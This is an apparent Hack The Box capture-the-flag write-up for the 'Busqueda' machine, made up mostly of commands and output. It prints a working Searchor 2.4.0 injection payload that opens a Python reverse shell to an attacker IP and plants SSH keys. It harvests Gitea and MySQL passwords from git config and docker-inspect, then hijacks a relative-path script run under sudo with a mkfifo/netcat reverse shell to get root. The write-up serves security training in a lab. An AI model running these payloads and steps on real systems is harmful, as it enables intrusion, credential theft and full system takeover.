Hostname:
```
searcher.htb
```

Web technology:
```
Server: Werkzeug/2.1.2 Python/3.10.6

Flask

Searchor 2.4.0
```

Searchfor RCE exploit:
```
https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-?tab=readme-ov-file
```
Payload:
```
', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.58',7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
```
=> BINGO! We got a shell as "svc"

Create SSH keys
```bash
# On Kali
ssh-keygen
python3 -m http.server 80

# On searcher
mkdir -p /home/svc/.ssh
cd /home/svc/.ssh
wget http://10.10.14.58/id_ed25519.pub
cat id_ed25519.pub > authorized_keys
```

Connect via SSH:
```bash
ssh -i ./id_ed25519 svc@10.10.11.208
```

# PrivEsc

Upload linpeas.sh:
```bash
wget http://10.10.14.58/linpeas.sh
```

OS:
```bash
uname -a
# Linux busqueda 5.15.0-69-generic #76-Ubuntu SMP Fri Mar 17 17:19:29 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux

cat /etc/issue
# Ubuntu 22.04.2 LTS \n \l
```

Ports:
```bash
netstat -tulpn

tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      tcp        0      0 127.0.0.1:222           0.0.0.0:*               LISTEN      tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      tcp        0      0 127.0.0.1:35709         0.0.0.0:*               LISTEN      tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      1633/python3        
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      tcp6       0      0 :::80                   :::*                    LISTEN      tcp6       0      0 :::22                   :::*                    LISTEN      udp        0      0 127.0.0.53:53           0.0.0.0:*                           udp        0      0 0.0.0.0:68              0.0.0.0:*                           
```
=> Port 222 is a SSH server
=> Port 35709 is a web server:
```bash
nc 127.0.0.1 35709

# HTTP/1.1 400 Bad Request
# Content-Type: text/plain; charset=utf-8
# Connection: close
```
=> Port 5000 same application as on port 80?
```bash
nc 127.0.0.1 5000

# GET / HTTP/1.1
# Host: searcher.htb

# HTTP/1.1 200 OK
# Server: Werkzeug/2.1.2 Python/3.10.6
# Date: Fri, 23 May 2025 20:25:35 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 13519
# Connection: close

# <!DOCTYPE html>
# [...]
# <p class="copyright">searcher.htb © 2023</p>
# [...]
```
From SSH connection we can use the same exploit:
```bash
curl -X POST http://127.0.0.1:5000/search --data "engine=Accuweather&query=', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.58',7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#"
```
=> The shell is also from "svc", so no privesc here.

=> On Port 3000 there is another web app:
```bash
nc 127.0.0.1 3000
# GET / HTTP/1.1
# Host: gitea.searcher.htb

# HTTP/1.1 200 OK
# Cache-Control: no-store, no-transform
# Content-Type: text/html; charset=UTF-8
# Set-Cookie: i_like_gitea=ea5b116266301ad8; Path=/; HttpOnly; SameSite=Lax
# [...]
```

More linpeas info:
```
127.0.0.1 localhost
127.0.1.1 busqueda searcher.htb gitea.searcher.htb

-rw-rw-r-- 1 svc svc 76 Apr  3  2023 /home/svc/.gitconfig
[user]
        email = cody@searcher.htb
        name = cody
```

where does this info come from?:
```bash
cat /var/www/app/.git/config

# url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
```
=> creds?: `cody:jh1usoih2bkjaspwe92`

This is the password for svc:
```bash
ssh svc@10.10.11.208
# jh1usoih2bkjaspwe92
```

## Port Forwarding

Local port 222 (on kali) is forwarded to remote (on 10.10.11.208) 127.0.0.1:222:
```bash
ssh -N -L 222:127.0.0.1:222 -i ./id_ed25519 svc@10.10.11.208
```
=> Only publickey auth

Local port 80 (on kali) is forwarded to remote (on 10.10.11.208) 127.0.0.1:3000:
```bash
ssh -N -L 80:127.0.0.1:3000 -i ./id_ed25519 svc@10.10.11.208
```
=> We can login with `cody:jh1usoih2bkjaspwe92`

```bash
# Gitea Version: 1.18.0+rc1

# Exploit ?
https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce
# => only for version < 1.13.
```

Looks promising:
```
/etc/.pm2/dump.pm2.bak
/usr/local/lib/node_modules/pm2/node_modules/@pm2/io/docker-compose.yml
```

Contents `dump.pm2.bak`:
```json
[
  {
    "versioning": null,
    "version": "N/A",
    "unstable_restarts": 0,
    "restart_time": 0,
    "created_at": 1655316840103,
    "axm_dynamic": {},
    "axm_options": {},
    "axm_monitor": {},
    "axm_actions": [],
    "pm_uptime": 1655316840103,
    "status": "online",
    "unique_id": "eb29996a-281e-49d5-88ff-dab0f48521d1",
    "PM2_HOME": "/etc/.pm2",
    "PYTHONUNBUFFERED": "1",
    "HOME": "/home/svc",
    "PM2_INTERACTOR_PROCESSING": "true",
    "PM2_USAGE": "CLI",
    "_": "/usr/local/bin/pm2",
    "PATH": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin",
    "JOURNAL_STREAM": "8:31554",
    "SHLVL": "1",
    "INVOCATION_ID": "36dc3763d9fb4301a089cf8c4d26f5f6",
    "LANG": "en_US.UTF-8",
    "SYSTEMD_EXEC_PID": "803",
    "PWD": "/home/svc/srv",
    "NODE_APP_INSTANCE": 0,
    "vizion_running": false,
    "km_link": false,
    "pm_pid_path": "/etc/.pm2/pids/run-0.pid",
    "pm_err_log_path": "/etc/.pm2/logs/run-error.log",
    "pm_out_log_path": "/etc/.pm2/logs/run-out.log",
    "exec_mode": "fork_mode",
    "pm_cwd": "/home/svc/srv",
    "pm_exec_path": "/home/svc/srv/run.py",
    "node_args": [],
    "name": "run",
    "filter_env": [],
    "namespace": "default",
    "exec_interpreter": "python3",
    "env": {
      "unique_id": "eb29996a-281e-49d5-88ff-dab0f48521d1",
      "run": {},
      "PM2_HOME": "/etc/.pm2",
      "PYTHONUNBUFFERED": "1",
      "HOME": "/home/svc",
      "PM2_INTERACTOR_PROCESSING": "true",
      "PM2_USAGE": "CLI",
      "_": "/usr/local/bin/pm2",
      "PATH": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin",
      "JOURNAL_STREAM": "8:31554",
      "SHLVL": "1",
      "INVOCATION_ID": "36dc3763d9fb4301a089cf8c4d26f5f6",
      "LANG": "en_US.UTF-8",
      "SYSTEMD_EXEC_PID": "803",
      "PWD": "/home/svc/srv"
    },
    "merge_logs": true,
    "vizion": true,
    "autorestart": true,
    "watch": true,
    "instance_var": "NODE_APP_INSTANCE",
    "pmx": true,
    "automation": true,
    "treekill": true,
    "username": "root",
    "uid": 1000,
    "gid": 1000,
    "windowsHide": true,
    "kill_retry_time": 100
  }
]
```
=> Is this a service file from a service that gets executed by root??

Show sudo privs:
```bash
sudo -l
# User svc may run the following commands on busqueda:
#     (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

The script is some kind of docker wrapper:
```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
# gitea
# mysql_db

sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq
# "GITEA__database__DB_TYPE=mysql"
# "GITEA__database__USER=gitea",
# "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh"

sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' mysql_db | jq
# "MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF",
# "MYSQL_USER=gitea",
# "MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh",
# "MYSQL_DATABASE=gitea",
```
=> We found some credentials/passwords:
```
yuiu1hoiu4i5ho1uh
jI86kGUuj87guWr3RyF
```
=> No luck with SSH as root

The creds work on the gitea webapp:
```bash
http://gitea.searcher.htb/
# administrator:yuiu1hoiu4i5ho1uh
```

If we inspect the commit for "administrator/scripts" we can see the file "system-checkup.py" which we are allowed to run as sudo:
```python
# [...]
 elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
# [...]
```
=> We see that the script executes a shell script "full-checkup.sh" in the current working directory.
=> We can hijack this shell script by providing our own "full-checkup.sh" script.


```bash
# Create shell script full-checkup.sh in cwd
vi full-checkup.sh

#!/bin/bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.58 7777 >/tmp/f

# Make it executable
chmod +x full-checkup.sh

# Run full-checkup
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

# sudo pw: jh1usoih2bkjaspwe92
```

We get a root shell on our listener:
```bash
nc -vlnp 7777
listening on [any] 7777 ...
connect to [10.10.14.58] from (UNKNOWN) [10.10.11.208] 46676
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
#
```